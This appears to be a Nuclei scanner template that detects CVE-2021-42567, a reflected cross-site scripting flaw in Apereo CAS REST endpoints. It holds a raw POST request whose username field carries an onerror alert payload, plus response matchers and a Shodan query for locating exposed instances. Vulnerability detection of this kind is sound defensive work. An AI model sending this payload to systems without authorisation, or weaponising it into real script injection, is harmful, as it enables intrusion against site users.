id: CVE-2021-42567
info:
  author: pdteam
  classification:
    cve-id: CVE-2021-42567
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: Apereo CAS through 6.4.1 allows cross-site scripting via POST requests
    sent to the REST API endpoints.
  metadata:
    shodan-query: http.title:'CAS - Central Authentication Service'
  name: Apereo CAS Reflected Cross-Site Scripting
  reference:
  - https://apereo.github.io/2021/10/18/restvuln/
  - https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html
  - https://github.com/sudohyak/exploit/blob/dcf04f704895fe7e042a0cfe9c5ead07797333cc/CVE-2021-42567/README.md
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42567
  - https://github.com/apereo/cas/releases
  severity: medium
  tags: cve,cve2021,apereo,xss,cas
requests:
- matchers:
  - condition: and
    type: word
    words:
    - <img/src/onerror=alert(document.domain)>
    - java.util.HashMap
  - status:
    - 401
    type: status
  matchers-condition: and
  raw:
  - 'POST /cas/v1/tickets/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test

    '
